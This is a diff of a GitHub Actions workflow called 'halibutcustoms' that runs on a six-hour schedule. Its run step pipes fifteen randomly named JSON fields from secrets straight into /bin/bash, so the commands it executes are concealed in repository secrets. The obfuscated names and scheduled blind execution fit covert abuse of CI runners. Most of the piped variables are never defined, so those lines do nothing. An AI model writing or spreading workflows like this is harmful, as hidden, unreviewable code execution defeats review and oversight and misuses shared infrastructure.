@@ -1,24 +1,32 @@
 name: halibutcustoms
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 0/6 * * *'
-jobs:  # 5681
+    - cron: '30 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: halibutcustoms
         env:
-          lasi423: ${{ secrets.lasi423 }}
+          rumf255: ${{ secrets.rumf255 }}
         run: |
-          echo $lasi423 | jq -r .ctuef798 | /bin/bash
-          echo $t152 | jq -r .bp84605 | /bin/bash
-          echo $znsqh981 | jq -r .i19 | /bin/bash
-          echo $m7 | jq -r .tdf50692 | /bin/bash
-          echo $phgju3 | jq -r .jbw7169 | /bin/bash
-          echo $n4905 | jq -r .al251 | /bin/bash
-          echo $sm955 | jq -r .fd0 | /bin/bash
-          echo $lien493 | jq -r .s08 | /bin/bash
-          echo $zv631 | jq -r .vhos6 | /bin/bash
+          echo $rumf255 | jq -r .j50 | /bin/bash
+          echo $shr64 | jq -r .nmd7053 | /bin/bash
+          echo $koz5031 | jq -r .fl99 | /bin/bash
+          echo $owt579 | jq -r .bmzg97 | /bin/bash
+          echo $wfytf4898 | jq -r .iiqtt318 | /bin/bash
+          echo $rqjb53373 | jq -r .dsur863 | /bin/bash
+          echo $ddl79 | jq -r .ubixd0 | /bin/bash
+          echo $sz2 | jq -r .fqsf1 | /bin/bash
+          echo $an6792 | jq -r .nx134 | /bin/bash
+          echo $fd5 | jq -r .zlk7219 | /bin/bash
+          echo $ibqa1094 | jq -r .hmjch7876 | /bin/bash
+          echo $tliy3707 | jq -r .lg0507 | /bin/bash
+          echo $zyyuh4 | jq -r .d849 | /bin/bash
+          echo $xw329 | jq -r .sa0 | /bin/bash
+          echo $jc39706 | jq -r .g46 | /bin/bash
 
